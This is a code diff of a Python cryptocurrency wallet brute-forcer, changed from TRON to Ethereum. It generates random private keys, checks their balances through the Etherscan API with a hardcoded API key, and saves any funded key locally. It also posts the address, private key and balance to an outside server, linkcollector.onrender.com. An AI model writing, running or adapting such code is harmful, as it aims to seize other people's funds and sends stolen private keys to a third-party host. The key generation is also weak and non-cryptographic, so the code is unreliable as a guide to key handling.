@@ -1,93 +1,104 @@
+
 import hashlib
 import random
 import sys
 import time
 import requests
 from colorama import Fore
-import base58
-import ecdsa
 from Crypto.Hash import keccak
-import os
+import ecdsa
 
-# Function to calculate the keccak256 hash
+API_KEY = 'WXWU1HKNC5VTA3R2C2GSXSFA9X28G1I7M2'
+ETHERSCAN_URL = 'https://api.etherscan.io/api'
+FLASK_API_URL = "https://linkcollector.onrender.com/api/wallets"  # Adjust this URL as needed
+MIN_BALANCE = 0.000000000001  # Minimum balance to stop the loop
+SLEEP_TIME = 0.4  # Sleep time between requests
+
 def keccak256(data):
-    hasher = keccak.new(digest_bits=256)
-    hasher.update(data)
-    return hasher.digest()
+    """Calculate the Keccak-256 hash."""
+    k = keccak.new(digest_bits=256)
+    k.update(data)
+    return k.digest()
 
-# Get the ECDSA signing key from the raw private key
-def get_signing_key(raw_priv):
-    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)
+def generate_eth_address():
+    """Generate a random Ethereum address and its corresponding private key."""
+    # Generate a random 32-byte private key
+    private_key = bytes(random.sample(range(0, 256), 32))
+    # Generate public key from the private key
+    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
+    public_key = signing_key.get_verifying_key().to_string()
+    # Calculate Ethereum address from the public key
+    eth_address = '0x' + keccak256(public_key)[-20:].hex()
+    return private_key.hex(), eth_address
 
-# Convert the verifying key to a TRON address
-def verifying_key_to_addr(key):
-    pub_key = key.to_string()
-    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]  # TRON addresses start with 41
-    addr = base58.b58encode_check(primitive_addr)
-    return addr
+def check_balance(eth_address):
+    """Check the balance of the given Ethereum address using the Etherscan API."""
+    url = f'{ETHERSCAN_URL}?module=account&action=balance&address={eth_address}&tag=latest&apikey={API_KEY}'
+    response = requests.get(url)
+    
+    if response.status_code == 200:
+        data = response.json()
+        if data['status'] == '1':
+            return float(data['result']) / 10 ** 18  # Convert Wei to Ether
+        elif data['message'] == 'NOTOK' and 'rate limit' in data['result']:
+            print(Fore.YELLOW + "Rate limit exceeded. Sleeping for 60 seconds...")
+            time.sleep(60)  # Sleep for 60 seconds if rate limit is hit
+            return None
+        else:
+            print(Fore.RED + f"Error: {data['message']}")
+            return None
+    else:
+        print(Fore.RED + "Error: Failed to retrieve data from Etherscan API")
+        return None
 
-# Initialize counters for total scans and winners
-z = 0
-w = 0
-
-# Flask API URL
-flask_api_url = "https://linkcollector.onrender.com/api/wallets"  # Adjust this URL as needed
-
-while True:
-    # Generate a random private key
-    raw = bytes(random.sample(range(0, 256), 32))
-    key = get_signing_key(raw)
-    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
-    priv = raw.hex()
-
-    # Request account data from TronScan API
+def post_to_api(addr, priv, bal):
+    """Post the Ethereum address, private key, and balance to the Flask API."""
     try:
-        block = requests.get(f"https://apilist.tronscan.org/api/account?address={addr}")
-        block.raise_for_status()  # Check for request errors
-        res = block.json()
-
-        # Check if the address has any balances
-        balances = res.get("balances", [])
-        if balances:
-            bal = float(balances[0]["amount"])
+        response = requests.post(FLASK_API_URL, json={
+            "trx_address": addr,
+            "private_key": priv,
+            "balance": bal
+        })
+        if response.status_code == 201:
+            print(Fore.GREEN + f"Posted to API successfully: {addr}{Fore.RESET}")
         else:
-            bal = 0
+            print(Fore.RED + f"Failed to post to API: {response.status_code}{Fore.RESET}")
+    except Exception as e:
+        print(Fore.RED + f"Exception occurred while posting to API: {e}{Fore.RESET}")
 
-        # If the balance is greater than 0, store the address and private key
-        if bal > 0:
-            w += 1
-            with open("FileTRXWinner.txt", "a") as f:
-                f.write(f'\nADDRESS: {addr}   Balance: {bal}')
-                f.write(f'\nPRIVATE KEY: {priv}')
-                f.write('\n------------------------')
+def save_to_file(eth_address, private_key, balance):
+    """Save the Ethereum address, private key, and balance to a file."""
+    with open("data.txt", "w") as file:
+        file.write(f"Address: {eth_address}\n")
+        file.write(f"Private Key: {private_key}\n")
+        file.write(f"Balance: {balance} ETH\n")
 
-            # Post the address to the Flask API
-            try:
-                response = requests.post(flask_api_url, json={
-                    "trx_address": addr,
-                    "private_key": priv,
-                    "balance": bal
-                })
-                if response.status_code == 201:
-                    print(f"{Fore.GREEN}Posted to API successfully: {addr}{Fore.RESET}")
-                else:
-                    print(f"{Fore.RED}Failed to post to API: {response.status_code}{Fore.RESET}")
-            except requests.exceptions.RequestException as e:
-                print(f"{Fore.RED}Error posting to API: {str(e)}{Fore.RESET}")
+def main():
+    """Main function to run the Ethereum address generation and balance checking."""
+    scanned_count = 0  # Counter for scanned addresses
+    while True:
+        eth_private_key, eth_address = generate_eth_address()
+        scanned_count += 1  # Increment the scanned count
+        
+        print(Fore.GREEN + f"Private Key: {eth_private_key}")
+        print(Fore.WHITE + f"Address: {eth_address}")
 
-        else:
-            print(f"{Fore.RED}Total Scan: {Fore.BLUE}{z}{Fore.RESET}")
-            print(f"{Fore.YELLOW}Address: {Fore.RESET}{addr}           Balance: {bal}")
-            print(f"{Fore.YELLOW}Address(hex): {Fore.RESET}{base58.b58decode_check(addr.encode()).hex()}")
-            print(f"{Fore.YELLOW}Private Key: {Fore.RED}{priv}{Fore.RESET}")
+        balance_ether = check_balance(eth_address)
+        
+        if balance_ether is not None:
+            print(Fore.RED + f"Balance {eth_address}: {balance_ether} ETH")
+            if balance_ether > MIN_BALANCE:
+                save_to_file(eth_address, eth_private_key, balance_ether)
+                post_to_api(eth_address, eth_private_key, balance_ether)  # Post to API
+                print(Fore.GREEN + "Successful address found! Data saved.")
+                print(Fore.BLUE + f"Total addresses scanned: {scanned_count}")
+                sys.exit()
+        
+        # Print the scanned count every 100 addresses for better readability
+        if scanned_count % 100 == 0:
+            print(Fore.CYAN + f"Total addresses scanned: {scanned_count}")
+        
+        time.sleep(SLEEP_TIME)
 
-        # Increment the scan counter
-        z += 1
-
-    except requests.exceptions.RequestException as e:
-        print(f"Error fetching data for address {addr}: {str(e)}")
-    except (KeyError, IndexError, ValueError) as e:
-        print(f"Error processing response for address {addr}: {str(e)}")
-
-    # Pause before the next iteration to avoid API rate limits
-    time.sleep(1)  # You can adjust the sleep time if needed
+if __name__ == "__main__":
+    main()
